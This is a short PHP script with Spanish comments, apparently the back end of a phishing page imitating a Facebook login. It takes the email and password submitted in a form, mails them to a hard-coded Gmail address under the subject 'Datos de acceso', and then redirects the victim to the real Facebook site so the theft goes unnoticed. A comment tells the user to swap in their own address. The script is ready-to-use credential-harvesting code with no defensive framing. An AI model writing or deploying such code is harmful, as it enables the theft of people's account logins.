<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['pass'];
    
    // Cambia esta dirección de correo electrónico por la tuya
    $to = "el.ratata0001@gmail.com";
    $subject = "Datos de acceso";
    $message = "Correo electrónico: $email \nContraseña: $password";
    $headers = "From: $email";

    // Envía el correo electrónico
    if (mail($to, $subject, $message, $headers)) 


      header("location: https://es-la.facebook.com");
    
    }
   

?>
